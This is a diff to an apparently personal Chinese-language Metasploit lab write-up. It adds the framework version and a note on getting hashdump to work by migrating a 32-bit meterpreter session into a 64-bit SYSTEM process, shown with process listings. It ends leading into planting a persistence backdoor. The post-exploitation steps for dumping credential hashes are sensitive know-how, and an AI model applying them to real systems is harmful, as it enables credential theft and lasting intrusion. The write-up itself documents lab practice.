@@ -11,6 +11,13 @@ category: metasploit
 
 > 纪念所有为国捐躯的英勇战士。
 
+后面的所有实验中，如未说明，我使用的都是Mac OSX上的
+
+```
+msfconsole --version
+Framework Version: 4.17.18-dev-6660b1857beb0befdb4a453c76e57fce94064867
+```
+
 ## 渗透测试阶段
 
 1. 前期交互：与客户讨论，确定目标及范围等
@@ -1153,6 +1160,26 @@ meterpreter > migrate 2224
 meterpreter > getpid
 Current pid: 2224
 ```
+
+---
+
+**更新**
+
+后来读到一篇博文[Dumping Hashes on Win2k8 R2 x64 with Metasploit](https://room362.com/post/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/)，作者在`hashdump`时遇到了同样的问题。他的解决方案是先把会话迁入一个具有system权限的64位进程，然后hashdump就可以成功。我这里的靶机也是64位的，但是一开始的meterpreter进程却是32位的，且它的权限token还是普通管理员权限（尽管使用了`getsystem`）。我按照他的方法尝试一下：
+
+```bash
+# original meterpreter
+1424  3424  aAEXKduKiUJr.exe   x86   1        TEST\rambo                    C:\Users\rambo\AppData\Local\Temp\radC2AA5.tmp\aAEXKduKiUJr.exe
+
+# after migrating
+1992  504   dllhost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\dllhost.exe
+```
+
+成功了：
+
+![Screen Shot 2018-10-23 at 6.40.01 PM.png]({{ site.url }}/images/metasploit/2.png)
+
+---
 
 渗透阶段接近尾声，我们留一个持久化后门（参考[Metasploit 「控制持久化」权限维持](https://www.bodkin.ren/index.php/archives/431/)）：
 
